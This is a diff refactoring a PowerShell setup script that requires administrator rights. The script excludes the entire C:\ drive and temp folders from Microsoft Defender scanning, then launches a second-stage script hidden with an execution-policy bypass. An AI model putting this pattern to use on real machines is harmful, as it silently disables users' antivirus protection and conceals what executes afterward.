@@ -1,42 +1,59 @@
+[CmdletBinding()]
+param(
+    [string]$SecondStagePath = "C:\22.ps1"
+)
 
-#region Logging Functions
+Set-StrictMode -Version Latest
+$ErrorActionPreference = "Stop"
+$LogFile = "C:\setup_log.txt"
 
-Function Log-Info($Message) {
+function Write-Log {
+    param(
+        [Parameter(Mandatory)][string]$Message,
+        [ValidateSet("INFO","ERROR")][string]$Level = "INFO"
+    )
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    Write-Host "$timestamp - INFO: $Message" -ForegroundColor Cyan
+    $entry = "$timestamp - $Level: $Message"
+    $color = if ($Level -eq "ERROR") { "Red" } else { "Cyan" }
+    Write-Host $entry -ForegroundColor $color
+    if ($Level -eq "ERROR") {
+        Add-Content -Path $LogFile -Value $entry
+    }
 }
 
-Function Log-Error($Message) {
-    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
-    $errorMsg = "$timestamp - ERROR: $Message"
-    Write-Host $errorMsg -ForegroundColor Red
-    Add-Content -Path "C:\setup_log.txt" -Value $errorMsg
-}
-#endregion
-
-#region Admin Check
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Log-Error "Please run this script as Administrator!"
-    exit 1
-}
-#endregion
-
-#region Pre-Defender Hardening (21.ps1)
-try {
-    Set-MpPreference -ExclusionPath "C:\", "C:\Windows\Temp", "C:\Packages"
-    Log-Info "Early Defender exclusion added for C:\\ and system temp directories."
-} catch {
-    Log-Error "Failed to set Defender exclusions early: $_"
+function Assert-Administrator {
+    if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+        Write-Log -Level "ERROR" -Message "Run this script from an elevated PowerShell prompt."
+        exit 1
+    }
 }
 
+function Prime-DefenderExclusions {
+    try {
+        Set-MpPreference -ExclusionPath "C:\", "C:\Windows\Temp", "C:\Packages" -ErrorAction Stop
+        Write-Log "Initial Defender exclusions added."
+    } catch {
+        Write-Log -Level "ERROR" -Message "Failed to add Defender exclusions: $_"
+    }
+}
+
+function Invoke-SecondStage {
+    param([string]$Path)
+
+    if (-not (Test-Path $Path)) {
+        Write-Log -Level "ERROR" -Message "Second stage script not found at $Path"
+        return
+    }
+
+    try {
+        Write-Log "Launching second stage setup ($Path)."
+        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$Path`"" -WindowStyle Hidden
+    } catch {
+        Write-Log -Level "ERROR" -Message "Failed to launch second stage setup: $_"
+    }
+}
+
+Assert-Administrator
+Prime-DefenderExclusions
 Start-Sleep -Seconds 10
-
-#region Start Full Setup (22.ps1)
-$scriptPath = "C:\\22.ps1"
-if (Test-Path $scriptPath) {
-    Log-Info "Executing second stage setup script (22.ps1)..."
-    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File $scriptPath" -WindowStyle Hidden
-} else {
-    Log-Error "Second stage setup script (22.ps1) not found!"
-}
-#endregion
+Invoke-SecondStage -Path $SecondStagePath
